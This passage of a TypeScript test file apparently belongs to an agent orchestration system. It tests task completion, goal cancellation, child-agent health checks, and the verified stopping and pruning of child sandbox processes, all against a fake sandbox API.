    db.raw.prepare("UPDATE children SET last_checked = datetime('now', '-2 minutes') WHERE id = 'kid'").run();

    const cleaned = await new SandboxCleanup(new FakeConway(), lifecycle, db.raw).cleanupStale(1);

    expect(cleaned).toBe(0);
    expect(state(db, "kid")).toBe("failed");
  });
});

// ─── Parent tools: complete_task (H3-008) and cancel_goal (F015) ─

describe("complete_task title lookup (H3-008)", () => {
  function task(goalId: string, title: string, status: string, assignedTo: string | null, createdAt: string): string {
    const id = insertTask(db.raw, {
      parentId: null,
      goalId,
      title,
      description: title,
      status: status as any,
      assignedTo,
      agentRole: null,
      priority: 50,
      dependencies: [],
      result: null,
    });
    db.raw.prepare("UPDATE task_graph SET created_at = ? WHERE id = ?").run(createdAt, id);
    return id;
  }

  it("completes the live self-assigned task, not an older failed one with the same title", async () => {
    const goal = createGoal(db.raw, "Site", "Build the site");
    const oldId = task(goal.id, "Write landing page copy", "failed", null, "2026-01-01T00:00:00.000Z");
    const newId = task(goal.id, "Write landing page copy", "assigned", identity.address, "2026-01-02T00:00:00.000Z");

    const out = await runTool(
      "complete_task",
      { task_id: "Write landing page copy", output: "done" },
      toolCtx(db, new FakeConway()),
    );

    expect(out).toMatch(/marked as completed/);
    const status = (id: string) => (db.raw.prepare("SELECT status FROM task_graph WHERE id = ?").get(id) as { status: string }).status;
    expect(status(newId)).toBe("completed");
    expect(status(oldId)).toBe("failed");
  });

  it("refuses an ambiguous title and lists the candidates", async () => {
    const goal = createGoal(db.raw, "Site", "Build the site");
    const a = task(goal.id, "Research competitors (EU)", "pending", null, "2026-01-01T00:00:00.000Z");
    const b = task(goal.id, "Research competitors (US)", "pending", null, "2026-01-02T00:00:00.000Z");

    const out = await runTool("complete_task", { task_id: "research competitors", output: "x" }, toolCtx(db, new FakeConway()));

    expect(out).toMatch(/ambiguous/);
    expect(out).toContain(a);
    expect(out).toContain(b);
  });

  it("keeps the spend already recorded on the task", async () => {
    const goal = createGoal(db.raw, "Site", "Build the site");
    const id = task(goal.id, "Deploy", "running", "local://local-worker-1", "2026-01-01T00:00:00.000Z");
    db.raw.prepare("UPDATE task_graph SET actual_cost_cents = 42 WHERE id = ?").run(id);

    await runTool("complete_task", { task_id: id, output: "manually resolved" }, toolCtx(db, new FakeConway()));

    const row = db.raw.prepare("SELECT status, actual_cost_cents AS c FROM task_graph WHERE id = ?").get(id);
    expect(row).toEqual({ status: "completed", c: 42 });
  });
});

describe("cancel_goal (F015)", () => {
  it("marks the goal cancelled and every unfinished task cancelled", async () => {
    const goal = createGoal(db.raw, "Weather API", "Build it");
    for (const status of ["pending", "assigned", "running", "blocked", "completed"]) {
      insertTask(db.raw, {
        parentId: null,
        goalId: goal.id,
        title: status,
        description: status,
        status: status as any,
        assignedTo: status === "pending" ? null : "local://w",
        agentRole: null,
        priority: 50,
        dependencies: [],
        result: null,
      });
    }

    const out = await runTool("cancel_goal", { goal_id: goal.id, reason: "changed plans" }, toolCtx(db, new FakeConway()));

    expect(out).toMatch(/4 unfinished task\(s\) cancelled/);
    const g = db.raw.prepare("SELECT status FROM goals WHERE id = ?").get(goal.id) as { status: string };
    expect(g.status).toBe("cancelled");
    const statuses = (db.raw.prepare("SELECT status FROM task_graph WHERE goal_id = ? ORDER BY title").all(goal.id) as Array<{
      status: string;
    }>).map((r) => r.status);
    expect(statuses.sort()).toEqual(["cancelled", "cancelled", "cancelled", "cancelled", "completed"]);
  });

  it("accepts a failed goal and refuses one that has ended", async () => {
    const failed = createGoal(db.raw, "Failed goal", "x");
    db.raw.prepare("UPDATE goals SET status = 'failed' WHERE id = ?").run(failed.id);
    const done = createGoal(db.raw, "Done goal", "x");
    db.raw.prepare("UPDATE goals SET status = 'completed' WHERE id = ?").run(done.id);

    expect(await runTool("cancel_goal", { goal_id: "Failed goal" }, toolCtx(db, new FakeConway()))).toMatch(/cancelled/);
    expect(await runTool("cancel_goal", { goal_id: done.id }, toolCtx(db, new FakeConway()))).toMatch(/already in 'completed'/);
    expect(await runTool("cancel_goal", { goal_id: failed.id }, toolCtx(db, new FakeConway()))).toMatch(/already in 'cancelled'/);
  });
});

// ─── Default liveness and manual checks ────────────────────────

describe("a child that never comes up is resolved on a default install", () => {
  it("the default heartbeat schedule runs check_child_health, also on an existing heartbeat.yml", () => {
    const dir = fs.mkdtempSync(nodePath.join(os.tmpdir(), "hb-"));
    try {
      const defaults = loadHeartbeatConfig(nodePath.join(dir, "missing.yml"));
      expect(defaults.entries.find((e) => e.name === "check_child_health")).toMatchObject({ enabled: true });

      const file = nodePath.join(dir, "heartbeat.yml");
      fs.writeFileSync(file, "entries:\n  - name: heartbeat_ping\n    schedule: '*/15 * * * *'\n    task: heartbeat_ping\n");
      const merged = loadHeartbeatConfig(file);
      expect(merged.entries.find((e) => e.name === "check_child_health")).toMatchObject({ task: "check_child_health" });
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("check_child_health is a no-op with no children", async () => {
    const conway = new FakeConway();
    const result = await BUILTIN_TASKS.check_child_health({} as any, heartbeatCtx(db, conway));
    expect(result.shouldWake).toBe(false);
    expect(conway.log).toEqual([]);
    expect(db.getKV("child_health.last_states")).toBeUndefined();
  });

  it("check_child_status applies its probe: a child left starting becomes healthy when its process is seen", async () => {
    makeChild(db, "kid", "starting", "sbx-kid");
    const conway = new FakeConway();

    const out = JSON.parse(await runTool("check_child_status", { child_id: "kid" }, toolCtx(db, conway)));

    expect(out).toMatchObject({ probe: "running", state: "healthy" });
    expect(state(db, "kid")).toBe("healthy");
  });

  it("check_child_status fails a starting child confirmed gone after the start grace period", async () => {
    makeChild(db, "kid", "starting", "sbx-kid");
    ageEvents(db, "kid", 11);
    const conway = new FakeConway(() => ok('{"status":"offline"}'));

    await runTool("check_child_status", { child_id: "kid" }, toolCtx(db, conway));

    expect(state(db, "kid")).toBe("failed");
  });
});

describe("child ids are visible to the model", () => {
  it("spawn_child, list_children and the lineage summary show the id the child tools take", async () => {
    const conway = new FakeConway();
    const spawned = await runTool("spawn_child", { name: "researcher" }, toolCtx(db, conway, { maxChildren: 2 }));
    const id = db.getChildren()[0].id;

    expect(spawned).toContain(`id: ${id}`);
    expect(await runTool("list_children", {}, toolCtx(db, conway))).toContain(`id: ${id}`);
    expect(getLineageSummary(db, createTestConfig())).toContain(`id: ${id}`);
  });
});

describe("pruning never loses a child whose process may still run", () => {
  function endedChildren(n: number): void {
    for (let i = 0; i < n; i++) makeChild(db, `f${i}`, "failed");
  }
  function backdate(id: string): void {
    db.raw.prepare("UPDATE children SET created_at = '2026-01-01T00:00:00.000Z' WHERE id = ?").run(id);
  }

  it("keeps a force-stopped child until a kill in its sandbox is verified", async () => {
    makeChild(db, "a0", "healthy", "sbx-a0");
    let reachable = false;
    const conway = new FakeConway((sandbox, command) => {
      if (!reachable) throw new Error("Conway API 503");
      return command.includes("pkill") ? ok("stopped") : defaultAnswer(sandbox, command);
    });
    conway.sandboxes = [sandboxInfo("sbx-a0")];
    await runTool("stop_child", { child_id: "a0", force: true }, toolCtx(db, conway));
    expect(state(db, "a0")).toBe("failed");
    backdate("a0");
    endedChildren(5);
    const cleanup = new SandboxCleanup(conway, new ChildLifecycle(db.raw), db.raw);

    expect(await pruneDeadChildren(db, cleanup)).toBe(0);
    expect(db.getChildById("a0")?.status).toBe("failed");
    expect(await runTool("stop_child", { child_id: "a0" }, toolCtx(db, conway))).not.toMatch(/not found/);

    reachable = true;
    expect(await pruneDeadChildren(db, cleanup)).toBe(1);
    expect(db.getChildById("a0")).toBeUndefined();
    expect(conway.log.some((l) => l.sandbox === "sbx-a0" && l.command.includes("pkill"))).toBe(true);
  });

  it("prunes a legacy ended row (no lifecycle events) once its process is verified gone", async () => {
    db.insertChild({
      id: "legacy",
      name: "legacy",
      address: nextWallet() as `0x${string}`,
      sandboxId: "sbx-legacy",
      genesisPrompt: "p",
      fundedAmountCents: 0,
      status: "failed",
      createdAt: "2026-01-01T00:00:00.000Z",
    });
    endedChildren(5);
    const conway = new FakeConway((sandbox, command) => (command.includes("pkill") ? ok("stopped") : defaultAnswer(sandbox, command)));

    expect(await pruneDeadChildren(db, new SandboxCleanup(conway, new ChildLifecycle(db.raw), db.raw))).toBe(1);

    expect(db.getChildById("legacy")).toBeUndefined();
    expect(conway.log.some((l) => l.sandbox === "sbx-legacy" && l.command.includes("pkill"))).toBe(true);
  });
});

describe("legacy rows from before the lifecycle machine", () => {
  it("stop_child kills and verifies the process of a legacy 'stopped' row (the old optimizer culled without killing)", async () => {
    db.insertChild({
      id: "culled",
      name: "culled",
      address: nextWallet() as `0x${string}`,
      sandboxId: "sbx-culled",
      genesisPrompt: "p",
      fundedAmountCents: 0,
      status: "stopped",
      createdAt: new Date().toISOString(),
    });
    const conway = new FakeConway((sandbox, command) => (command.includes("pkill") ? ok("stopped") : defaultAnswer(sandbox, command)));

    const out = await stopChild(db, conway, "culled", "cleanup");

    expect(out).not.toMatch(/already ended/);
    expect(conway.log.find((l) => l.command.includes("pkill"))?.sandbox).toBe("sbx-culled");
    expect(db.getChildById("culled")?.status).toBe("dead");
  });
});

describe("the parent's status views count local workers and live tasks", () => {
  function seedGoal(): string {
    const goal = createGoal(db.raw, "Goal", "x");
    const add = (title: string, status: string, assignedTo: string | null) =>
      insertTask(db.raw, {
        parentId: null,
        goalId: goal.id,
        title,
        description: title,
        status: status as any,
        assignedTo,
        agentRole: null,
        priority: 50,
        dependencies: [],
        result: null,
      });
    add("running", "running", "local://local-worker-1");
    add("done", "completed", "local://local-worker-0");
    add("superseded", "cancelled", null);
    add("next", "pending", null);
    return goal.id;
  }

  it("the status block shows running workers and leaves superseded tasks out of the total", () => {
    seedGoal();
    const status = getOrchestratorStatus(db.raw);
    expect(status).toContain("Running workers: 1");
    expect(status).toContain("Tasks: 1/3 completed");
  });

  it("orchestrator_status reports local workers, and list_goals the effective total", async () => {
    seedGoal();
    const conway = new FakeConway();
    expect(await runTool("orchestrator_status", {}, toolCtx(db, conway))).toContain("Local workers running: 1");
    expect(await runTool("list_goals", {}, toolCtx(db, conway))).toContain("1/3 completed");
  });
});
